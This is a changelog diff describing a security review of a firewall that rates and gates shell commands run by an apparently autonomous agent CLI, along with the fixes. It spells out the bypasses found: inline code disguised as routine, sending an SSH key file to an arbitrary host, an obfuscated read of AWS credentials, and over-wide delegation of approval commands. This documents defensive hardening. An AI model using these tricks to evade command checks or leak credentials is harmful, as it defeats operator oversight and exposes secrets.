@@ -506,6 +506,29 @@ Versions before `0.2.1-beta.0` were internal; their numbers do not correspond to
 
 ### Security
 
+- **Review fixes for the autonomy CLI rules and operator delegation (DE-115).** Finding (independent
+  review of F-02 part 2 and DE-114): `node -e "...//pi-autonomy"` and `python3 -c "...#/pi-autonomy"` ran
+  arbitrary code rated as the autonomy CLI's routine `status` (low); `/tmp/x/pi-autonomy status` was low
+  by its name alone; `up`, `inbox --answer`, `backlog` and `board` changes were not control commands, and
+  `pi-autonomy report --ntfy-token-file ~/.ssh/id_ed25519 --ntfy-url <any host>` sent a credential file
+  rated low; `cat ~-/.aws/credentials` lost its credential read; delegation allowed `resume` (which can
+  approve or start a run), `answer`, `raise-budget`, `restart`, `units`, `tick` and `board-push`, with
+  any option, so `resume --approve` was delegable; `firewall.json` at a `PI_KIT_FIREWALL_CONFIG` path was
+  not protected, and a delegation change left no audit record. Cause: the CLI was matched by suffix in any
+  operand, including inline code; control was a deny list; option values were not classified; `~-` resolved
+  to nothing; the delegable set was too wide and only the first argument was checked. Fix: inline code is
+  never the CLI and a word with spaces or shell punctuation is never a path to it; its routine and medium
+  ratings apply only to `pi-autonomy` by name or the workspace's CLI script; the CLI's commands are an
+  allow list (reading routine; `report`, `key-limit`, `export`, `doctor --setup`, `boundary --probe`
+  medium; everything else, unknown commands included, control); `--config`, `--file`,
+  `--ntfy-token-file`, `--spec-file` and `--repo` values are reads and `--out` a write; `~-` (and `~+`
+  with no known directory) resolve under a placeholder outside every workspace; delegation covers only
+  `status`, `pause`, `steer`, `backlog` and `metrics`, never with an option, with the grant-like verbs
+  never delegable; the program must be the whole first word; `firewall.json` joins the protected boundary
+  and each change of the delegations is audited as `delegations_changed`. Authority change: for operator
+  review. Verification: `tests/firewall-shell-smoke.ts`, `tests/firewall-delegation-smoke.ts`,
+  `tests/firewall-unattended-smoke.ts`; each of the 16 guards was reverted and its test failed.
+
 - **Naming the autonomy CLI no longer makes a package command routine (DE-114).** Finding: since the
   previous change to the autonomy CLI's control commands, `npm install left-pad pi-autonomy`, `npx left-pad
   pi-autonomy` and `npx pi-autonomy status` were low instead of medium (install, or fetch and run), and
